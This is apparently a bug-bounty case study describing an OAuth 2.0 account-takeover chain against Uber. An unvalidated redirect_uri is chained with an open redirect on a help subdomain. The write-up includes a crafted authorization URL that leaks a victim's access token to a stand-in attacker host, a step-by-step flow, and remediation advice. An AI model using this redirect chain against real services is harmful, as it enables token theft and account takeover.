# Case Study: Uber OAuth 2.0 Account Takeover Chain

- **Target:** Uber Authentication Endpoint
- **Severity:** Critical (Account Takeover)
- **Bounty Awarded:** $10,000+
- **Vulnerability Chain:** Unvalidated `redirect_uri` + Open Redirect + Access Token Leaks via Fragment (`#`)

---

## 🔍 Vulnerability Details

An attacker identified an open redirect vulnerability on a legitimate secondary subdomain (`help.uber.com/redirect?url=https://attacker.com`). When initiating an OAuth 2.0 authorization flow (`https://auth.uber.com/oauth/v2/authorize`), the `redirect_uri` parameter strictly validated domain names (`*.uber.com`), but failed to sanitize sub-path redirects.

## 🛠️ Step-by-Step Chain Execution

1. **Crafted OAuth URL:**
   ```
   https://auth.uber.com/oauth/v2/authorize?client_id=uber_app&response_type=token&redirect_uri=https://help.uber.com/redirect?url=https://attacker.com/callback
   ```
2. **Victim Action:** The victim clicks the link while logged into Uber.
3. **Execution Flow:**
   - Auth server validates `https://help.uber.com` as a valid domain.
   - Auth server redirects victim to `https://help.uber.com/redirect?url=https://attacker.com/callback#access_token=EYJ...`
   - Secondary subdomain executes the open redirect to `https://attacker.com/callback#access_token=EYJ...`
   - Attacker server receives the access token via URL fragment leak.

---

## 🛡️ Remediation Pattern

- Use exact string matching for `redirect_uri` against an explicit whitelist of callback endpoints rather than wildcard subdomains (`*.domain.com`).
- Enforce strict parameter validation on open redirect handlers across all subdomains.
